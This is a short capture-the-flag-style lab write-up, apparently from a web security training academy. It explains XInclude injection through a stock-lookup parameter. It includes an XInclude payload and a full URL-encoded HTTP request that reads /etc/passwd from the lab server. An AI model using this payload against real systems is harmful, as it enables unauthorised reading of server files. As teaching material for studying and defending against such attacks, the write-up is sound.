# Lab: Exploiting XInclude to retrieve files
## Description
The application's stock lookup function accepts the following input:
```
productId=1&storeId=1
```
Clearly, we don't control the entire XML document and can therefore not define DTD entities. But the `productId` parameter value is injected into an XML document on the server-side.

By injecting an XInclude namespace and path to a file we wish to include. Example payload:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Solution

URL encode the XInclude payload into the `productId` parameter:

```yaml
POST /product/stock HTTP/1.1
Host: ac901f441f1bc690c0870a6800db006b.web-security-academy.net
Content-Length: 142
Content-Type: application/x-www-form-urlencoded

productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude">
<xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
```